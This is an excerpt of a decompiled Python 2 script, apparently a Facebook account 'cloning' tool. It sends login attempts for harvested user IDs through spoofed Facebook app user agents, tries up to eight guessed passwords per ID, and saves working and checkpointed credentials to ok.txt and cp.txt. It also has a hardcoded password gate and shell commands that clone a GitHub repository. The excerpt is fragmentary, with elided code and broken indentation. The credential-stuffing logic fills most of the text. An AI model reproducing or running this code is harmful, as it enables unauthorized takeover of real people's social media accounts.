# Decompiled By REUBEN MADAGALI
# Github : https://github.com/Kefo82
#!/usr/bin/python2
# -*- coding: utf-8

#AUTHOR : REUBEN MADAGALI (BEGE)
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO BEGE
...
agents = [
					...
					" [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
					"Mozilla/5.0 (Windows NT 6.1; rv:64.0) Gecko/20100101 Firefox/64.0;] [ip:197.253.12.229;]",
					"Mozilla/5.0 (Linux; Android 7.1.1; CPH1723) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
...
header = {"user-agent": '[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:65.0) Gecko/20100101 Firefox/65.0;]',
...
\033[37;1m[\033[41;1mOKENWA BRIGHT\033[00;1m\033[37;1m ]\n

 \033[32;1mCreator \033[37;1m: \033[33;1mOKENWA BRIGHT

 \033[32;1mVersion \033[37;1m: \033[33;1m100                                   
"""
CorrectUsername = "KEFO"
CorrectPassword = "202020"
...
def main():
	...
	print("")
	print("\033[92;1m  [1] PUBLIC CLONE")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://wa.me/+2347061758885"])
		main()
		...
		import os
		try:
			os.system("git clone https://github.com/Okenwa24/New-Year")
			os.system("rm -rf lolcat")
			os.system("cp -f lolcat/lolcat.py \\.")
			os.system("rm -rf lolcat")
...
def menu():
    ...
    print("\033[93;1m     DEVICE IP : \033[92;1m") + ip
    print("")
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in q and "EAAA" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in q and "EAAA" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in q and "EAAA" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in q and "EAAA" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													if "access_token" in q and "EAAA" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															if "access_token" in q and "EAAA" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [KEFO-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [KEFO-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
